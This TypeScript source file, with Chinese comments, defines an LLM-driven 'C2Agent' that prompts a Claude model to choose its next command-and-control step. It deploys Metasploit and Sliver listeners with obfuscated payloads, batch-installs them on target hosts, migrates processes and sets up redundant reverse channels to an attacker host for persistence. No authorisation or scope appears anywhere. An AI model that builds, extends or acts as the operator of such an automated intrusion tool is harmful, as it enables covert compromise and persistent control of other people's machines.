import Anthropic from '@anthropic-ai/sdk';
import { ToolResult } from '../../core/types';
import {
  startMetasploitListener,
  generateMetasploitPayload,
  startSliverServer,
  listC2Sessions
} from '../tools';
import {
  deployMetasploitInfrastructure,
  deploySliverInfrastructure,
  batchDeployPayloads,
  manageC2Sessions,
  automateC2Migration,
  establishRedundantC2Channels
} from '../skills';

/**
 * C2拓扑图
 */
interface C2Graph {
  sourceShellId: string;

  // C2基础设施
  infrastructure: {
    metasploit: {
      listeners: Array<{ listenerId: string; port: number; payload: string }>;
      payloads: Array<{ path: string; format: string; size: number }>;
    };
    sliver: {
      servers: Array<{ serverId: string; protocol: string; url: string }>;
      implants: Array<{ name: string; path: string; os: string; size: number }>;
    };
    cobaltstrike: {
      servers: Array<{ serverId: string; host: string; port: number }>;
    };
  };

  // C2会话
  sessions: Array<{
    id: string;
    c2Type: 'metasploit' | 'sliver' | 'cobaltstrike';
    targetIp: string;
    targetHost: string;
    user: string;
    privilege: string;
    os: string;
    healthy: boolean;
    lastSeen: Date;
  }>;

  // 部署记录
  deployments: Array<{
    targetIp: string;
    payloadPath: string;
    remotePath: string;
    pid?: number;
    timestamp: Date;
    success: boolean;
  }>;

  // 冗余通道
  redundantChannels: Array<{
    targetIp: string;
    channels: Array<{ type: string; protocol: string; port: number; active: boolean }>;
  }>;
}

/**
 * C2 Agent - C2部署智能体
 *
 * 职责：
 * 1. 选择并部署合适的C2框架
 * 2. 生成多平台、多格式的payload
 * 3. 批量部署payload到目标主机
 * 4. 管理和维护C2会话
 * 5. 建立冗余C2通道确保持久性
 * 6. 维护C2拓扑图
 */
export class C2Agent {
  private client: Anthropic;
  private graph: C2Graph;
  private conversationHistory: Array<{ role: 'user' | 'assistant'; content: string }> = [];

  constructor(
    private shellId: string,
    private sessionDir: string,
    private lhost: string,
    private targets: Array<{ shellId: string; ip: string; os: string }> = [],
    apiKey?: string
  ) {
    this.client = new Anthropic({
      apiKey: apiKey || process.env.ANTHROPIC_API_KEY
    });

    this.graph = {
      sourceShellId: shellId,
      infrastructure: {
        metasploit: {
          listeners: [],
          payloads: []
        },
        sliver: {
          servers: [],
          implants: []
        },
        cobaltstrike: {
          servers: []
        }
      },
      sessions: [],
      deployments: [],
      redundantChannels: []
    };
  }

  /**
   * 系统提示词 - 定义 Agent 的角色和能力
   */
  private getSystemPrompt(): string {
    return `你是一个专业的C2部署智能体（C2 Deployment Agent），负责部署和管理命令与控制（C2）基础设施。

你的核心能力：
1. **C2选择** - 根据目标环境选择最佳C2框架（Metasploit、Sliver、Cobalt Strike）
2. **基础设施部署** - 部署监听器、生成payload、配置通信协议
3. **批量部署** - 并行部署payload到多个目标主机
4. **会话管理** - 监控会话健康状态、执行进程迁移
5. **冗余通道** - 建立多个C2通道确保持久性

可用的技能（Skills）：
- deployMetasploitInfrastructure: 部署完整的Metasploit C2基础设施
- deploySliverInfrastructure: 部署Sliver C2基础设施
- batchDeployPayloads: 批量部署payload到目标主机
- manageC2Sessions: 管理C2会话（健康检查、信息收集）
- automateC2Migration: 自动化C2进程迁移
- establishRedundantC2Channels: 建立冗余C2通道

决策原则：
1. **优先Metasploit** - Metasploit成熟稳定，适合大多数场景
2. **多协议部署** - 同时部署HTTP/HTTPS/TCP监听器
3. **批量并行** - 同时部署到所有目标以提高效率
4. **进程迁移** - 会话建立后立即迁移到稳定进程
5. **冗余备份** - 每个目标至少2个C2通道

当前状态：
- 源Shell: ${this.graph.sourceShellId}
- C2服务器: ${this.lhost}
- 目标主机: ${this.targets.length}
- Metasploit监听器: ${this.graph.infrastructure.metasploit.listeners.length}
- Sliver服务器: ${this.graph.infrastructure.sliver.servers.length}
- 活跃会话: ${this.graph.sessions.filter(s => s.healthy).length}

请根据当前状态和可用技能，制定下一步C2部署计划。`;
  }

  /**
   * LLM 驱动的决策引擎
   */
  private async makeDecision(): Promise<string> {
    this.conversationHistory.push({
      role: 'user',
      content: `当前C2部署状态：
- Metasploit监听器: ${this.graph.infrastructure.metasploit.listeners.length}
- Metasploit Payload: ${this.graph.infrastructure.metasploit.payloads.length}
- Sliver服务器: ${this.graph.infrastructure.sliver.servers.length}
- Sliver Implant: ${this.graph.infrastructure.sliver.implants.length}
- 活跃会话: ${this.graph.sessions.filter(s => s.healthy).length}/${this.graph.sessions.length}
- 部署记录: ${this.graph.deployments.length}
- 目标主机: ${this.targets.length}

请决定下一步行动。可选操作：
1. deploy_metasploit - 部署Metasploit基础设施
2. deploy_sliver - 部署Sliver基础设施
3. batch_deploy - 批量部署payload
4. manage_sessions - 管理C2会话
5. migrate_process - 自动化进程迁移
6. establish_redundancy - 建立冗余通道
7. complete - C2部署完成

请只返回操作名称，不要有其他内容。`
    });

    try {
      const response = await this.client.messages.create({
        model: 'claude-sonnet-4-20250514',
        max_tokens: 500,
        system: this.getSystemPrompt(),
        messages: this.conversationHistory
      });

      const decision = response.content[0].type === 'text'
        ? response.content[0].text.trim().toLowerCase()
        : 'deploy_metasploit';

      this.conversationHistory.push({
        role: 'assistant',
        content: decision
      });

      return decision;
    } catch (error) {
      console.error('LLM decision failed:', error);
      return this.fallbackDecision();
    }
  }

  /**
   * 降级决策逻辑（当 LLM 失败时）
   */
  private fallbackDecision(): string {
    // 如果还没部署Metasploit基础设施，先部署
    if (this.graph.infrastructure.metasploit.listeners.length === 0) {
      return 'deploy_metasploit';
    }

    // 如果有目标但还没部署payload，批量部署
    if (this.targets.length > 0 && this.graph.deployments.length === 0) {
      return 'batch_deploy';
    }

    // 如果有会话但还没管理，管理会话
    if (this.graph.sessions.length > 0) {
      const unhealthySessions = this.graph.sessions.filter(s => !s.healthy);
      if (unhealthySessions.length > 0) {
        return 'manage_sessions';
      }
    }

    // 如果有会话但还没建立冗余，建立冗余
    if (this.graph.sessions.length > 0 && this.graph.redundantChannels.length === 0) {
      return 'establish_redundancy';
    }

    // 如果还没部署Sliver，部署Sliver作为备份
    if (this.graph.infrastructure.sliver.servers.length === 0) {
      return 'deploy_sliver';
    }

    // 所有任务完成
    return 'complete';
  }

  /**
   * 执行部署Metasploit基础设施
   */
  private async executeDeployMetasploit(): Promise<void> {
    console.log('[C2Agent] 部署Metasploit基础设施...');

    const result = await deployMetasploitInfrastructure(
      this.graph.sourceShellId,
      this.sessionDir,
      {
        lhost: this.lhost,
        lports: [4444, 4445, 443],
        payloadFormats: ['exe', 'elf', 'dll'],
        enableObfuscation: true
      }
    );

    if (result.success && result.data) {
      this.graph.infrastructure.metasploit.listeners = result.data.listeners;
      this.graph.infrastructure.metasploit.payloads = result.data.payloads;

      console.log(`[C2Agent] Metasploit部署完成: ${result.data.listeners.length} 监听器, ${result.data.payloads.length} payload`);
    } else {
      console.error('[C2Agent] Metasploit部署失败:', result.error);
    }
  }

  /**
   * 执行部署Sliver基础设施
   */
  private async executeDeploySliver(): Promise<void> {
    console.log('[C2Agent] 部署Sliver基础设施...');

    const result = await deploySliverInfrastructure(
      this.graph.sourceShellId,
      this.sessionDir,
      {
        lhost: this.lhost,
        protocols: ['https', 'mtls'],
        platforms: [
          { os: 'windows', arch: 'amd64' },
          { os: 'linux', arch: 'amd64' }
        ]
      }
    );

    if (result.success && result.data) {
      this.graph.infrastructure.sliver.servers = result.data.servers;
      this.graph.infrastructure.sliver.implants = result.data.implants;

      console.log(`[C2Agent] Sliver部署完成: ${result.data.servers.length} 服务器, ${result.data.implants.length} implant`);
    } else {
      console.error('[C2Agent] Sliver部署失败:', result.error);
    }
  }

  /**
   * 执行批量部署
   */
  private async executeBatchDeploy(): Promise<void> {
    console.log('[C2Agent] 批量部署Payload...');

    if (this.targets.length === 0) {
      console.log('[C2Agent] 没有目标主机');
      return;
    }

    if (this.graph.infrastructure.metasploit.payloads.length === 0) {
      console.log('[C2Agent] 没有可用的payload');
      return;
    }

    // 选择第一个payload（通常是ELF格式用于Linux）
    const payload = this.graph.infrastructure.metasploit.payloads[0];

    const result = await batchDeployPayloads(
      this.graph.sourceShellId,
      this.sessionDir,
      this.targets,
      payload.path
    );

    if (result.success && result.data) {
      // 记录部署
      for (const deployed of result.data.deployed) {
        this.graph.deployments.push({
          targetIp: deployed.targetIp,
          payloadPath: payload.path,
          remotePath: deployed.remotePath,
          pid: deployed.pid,
          timestamp: new Date(),
          success: true
        });
      }

      for (const failed of result.data.failed) {
        this.graph.deployments.push({
          targetIp: failed.targetIp,
          payloadPath: payload.path,
          remotePath: '',
          timestamp: new Date(),
          success: false
        });
      }

      console.log(`[C2Agent] 批量部署完成: ${result.data.deployed.length}/${this.targets.length} 成功`);
    } else {
      console.error('[C2Agent] 批量部署失败:', result.error);
    }
  }

  /**
   * 执行管理会话
   */
  private async executeManageSessions(): Promise<void> {
    console.log('[C2Agent] 管理C2会话...');

    const result = await manageC2Sessions(
      this.graph.sourceShellId,
      'metasploit'
    );

    if (result.success && result.data) {
      // 更新会话列表
      this.graph.sessions = result.data.sessions.map(s => ({
        id: s.id,
        c2Type: 'metasploit' as const,
        targetIp: s.host,
        targetHost: s.host,
        user: s.user,
        privilege: s.privilege,
        os: s.os,
        healthy: s.healthy,
        lastSeen: new Date()
      }));

      console.log(`[C2Agent] 会话管理完成: ${result.data.healthySessions}/${result.data.totalSessions} 健康`);
    } else {
      console.error('[C2Agent] 会话管理失败:', result.error);
    }
  }

  /**
   * 执行进程迁移
   */
  private async executeMigrateProcess(): Promise<void> {
    console.log('[C2Agent] 自动化进程迁移...');

    const healthySessions = this.graph.sessions.filter(s => s.healthy && s.c2Type === 'metasploit');

    for (const session of healthySessions) {
      const result = await automateC2Migration(
        this.graph.sourceShellId,
        'metasploit',
        session.id
      );

      if (result.success && result.data) {
        console.log(`[C2Agent] ✓ 会话 ${session.id} 迁移成功: ${result.data.originalPid} -> ${result.data.targetPid}`);
      } else {
        console.log(`[C2Agent] ✗ 会话 ${session.id} 迁移失败`);
      }
    }
  }

  /**
   * 执行建立冗余通道
   */
  private async executeEstablishRedundancy(): Promise<void> {
    console.log('[C2Agent] 建立冗余C2通道...');

    for (const target of this.targets) {
      const c2Configs = [
        { type: 'metasploit' as const, lhost: this.lhost, lport: 4444, protocol: 'tcp' },
        { type: 'metasploit' as const, lhost: this.lhost, lport: 443, protocol: 'https' }
      ];

      const result = await establishRedundantC2Channels(
        this.graph.sourceShellId,
        this.sessionDir,
        target.shellId,
        target.ip,
        c2Configs
      );

      if (result.success && result.data) {
        this.graph.redundantChannels.push({
          targetIp: target.ip,
          channels: result.data.channels.map(c => ({
            type: c.type,
            protocol: c.protocol,
            port: c.port,
            active: c.connected
          }))
        });

        console.log(`[C2Agent] ✓ 冗余通道建立: ${target.ip} (${result.data.activeChannels}/${result.data.totalChannels} 活跃)`);
      }
    }
  }

  /**
   * 生成C2部署报告
   */
  private generateReport(): any {
    return {
      summary: {
        sourceShell: this.graph.sourceShellId,
        c2Server: this.lhost,
        totalTargets: this.targets.length,
        successfulDeployments: this.graph.deployments.filter(d => d.success).length,
        activeSessions: this.graph.sessions.filter(s => s.healthy).length,
        totalSessions: this.graph.sessions.length,
        redundantChannels: this.graph.redundantChannels.length
      },
      infrastructure: {
        metasploit: {
          listeners: this.graph.infrastructure.metasploit.listeners.length,
          payloads: this.graph.infrastructure.metasploit.payloads.length,
          listenerDetails: this.graph.infrastructure.metasploit.listeners
        },
        sliver: {
          servers: this.graph.infrastructure.sliver.servers.length,
          implants: this.graph.infrastructure.sliver.implants.length,
          serverDetails: this.graph.infrastructure.sliver.servers
        }
      },
      sessions: this.graph.sessions.map(s => ({
        id: s.id,
        type: s.c2Type,
        target: s.targetIp,
        user: s.user,
        privilege: s.privilege,
        os: s.os,
        healthy: s.healthy
      })),
      deployments: this.graph.deployments.map(d => ({
        target: d.targetIp,
        success: d.success,
        pid: d.pid,
        timestamp: d.timestamp.toISOString()
      })),
      redundantChannels: this.graph.redundantChannels.map(rc => ({
        target: rc.targetIp,
        channels: rc.channels.length,
        active: rc.channels.filter(c => c.active).length
      })),
      recommendations: this.generateRecommendations()
    };
  }

  /**
   * 生成C2部署建议
   */
  private generateRecommendations(): string[] {
    const recommendations: string[] = [];

    const deploymentRate = this.targets.length > 0
      ? (this.graph.deployments.filter(d => d.success).length / this.targets.length) * 100
      : 0;

    if (deploymentRate >= 80) {
      recommendations.push(`✓ C2部署成功率高 (${deploymentRate.toFixed(1)}%)，大部分目标已建立C2通道`);
    } else if (deploymentRate >= 50) {
      recommendations.push(`C2部署成功率中等 (${deploymentRate.toFixed(1)}%)，建议重试失败的目标`);
    } else {
      recommendations.push(`C2部署成功率较低 (${deploymentRate.toFixed(1)}%)，建议检查网络连接和防火墙`);
    }

    const sessionHealthRate = this.graph.sessions.length > 0
      ? (this.graph.sessions.filter(s => s.healthy).length / this.graph.sessions.length) * 100
      : 0;

    if (sessionHealthRate < 100 && this.graph.sessions.length > 0) {
      recommendations.push(`有 ${this.graph.sessions.filter(s => !s.healthy).length} 个会话不健康，建议重新部署`);
    }

    if (this.graph.redundantChannels.length < this.targets.length) {
      recommendations.push(`建议: 为所有目标建立冗余C2通道以确保持久性`);
    }

    if (this.graph.infrastructure.sliver.servers.length === 0) {
      recommendations.push(`建议: 部署Sliver作为备份C2框架`);
    }

    const rootSessions = this.graph.sessions.filter(s => s.privilege === 'root' || s.privilege === 'admin');
    if (rootSessions.length > 0) {
      recommendations.push(`✓ 已获得 ${rootSessions.length} 个高权限会话`);
    }

    return recommendations;
  }

  /**
   * 主执行循环
   */
  async run(): Promise<ToolResult<any>> {
    console.log('[C2Agent] 启动C2部署智能体...');
    console.log(`[C2Agent] C2服务器: ${this.lhost}`);
    console.log(`[C2Agent] 目标主机: ${this.targets.length}`);

    let maxIterations = 10;
    let iteration = 0;

    while (iteration < maxIterations) {
      iteration++;
      console.log(`\n[C2Agent] === 迭代 ${iteration}/${maxIterations} ===`);

      // LLM 决策
      const decision = await this.makeDecision();
      console.log(`[C2Agent] 决策: ${decision}`);

      // 执行决策
      switch (decision) {
        case 'deploy_metasploit':
          await this.executeDeployMetasploit();
          break;

        case 'deploy_sliver':
          await this.executeDeploySliver();
          break;

        case 'batch_deploy':
          await this.executeBatchDeploy();
          break;

        case 'manage_sessions':
          await this.executeManageSessions();
          break;

        case 'migrate_process':
          await this.executeMigrateProcess();
          break;

        case 'establish_redundancy':
          await this.executeEstablishRedundancy();
          break;

        case 'complete':
          console.log('[C2Agent] 任务完成，生成报告...');
          maxIterations = 0; // 退出循环
          break;

        default:
          console.log(`[C2Agent] 未知决策: ${decision}，使用降级逻辑`);
          const fallback = this.fallbackDecision();
          if (fallback === 'complete') {
            maxIterations = 0;
          }
      }
    }

    // 生成最终报告
    const report = this.generateReport();

    console.log('\n[C2Agent] ========== C2部署报告 ==========');
    console.log(`C2服务器: ${report.summary.c2Server}`);
    console.log(`目标主机: ${report.summary.totalTargets}`);
    console.log(`成功部署: ${report.summary.successfulDeployments}/${report.summary.totalTargets}`);
    console.log(`活跃会话: ${report.summary.activeSessions}/${report.summary.totalSessions}`);
    console.log(`冗余通道: ${report.summary.redundantChannels}`);
    console.log('\nC2基础设施:');
    console.log(`  - Metasploit监听器: ${report.infrastructure.metasploit.listeners}`);
    console.log(`  - Metasploit Payload: ${report.infrastructure.metasploit.payloads}`);
    console.log(`  - Sliver服务器: ${report.infrastructure.sliver.servers}`);
    console.log(`  - Sliver Implant: ${report.infrastructure.sliver.implants}`);
    console.log('\n活跃会话:');
    report.sessions.forEach((s: any) => {
      console.log(`  - ${s.id}: ${s.target} (${s.user}@${s.privilege}) [${s.healthy ? '健康' : '不健康'}]`);
    });
    console.log('\n建议:');
    report.recommendations.forEach((rec: string) => console.log(`  ${rec}`));
    console.log('==========================================\n');

    return {
      success: true,
      data: report,
      message: `C2部署完成: ${report.summary.activeSessions}/${report.summary.totalSessions} 会话活跃`
    };
  }
}

/**
 * 导出便捷函数
 */
export async function runC2Agent(
  shellId: string,
  sessionDir: string,
  lhost: string,
  targets: Array<{ shellId: string; ip: string; os: string }> = [],
  apiKey?: string
): Promise<ToolResult<any>> {
  const agent = new C2Agent(shellId, sessionDir, lhost, targets, apiKey);
  return agent.run();
}
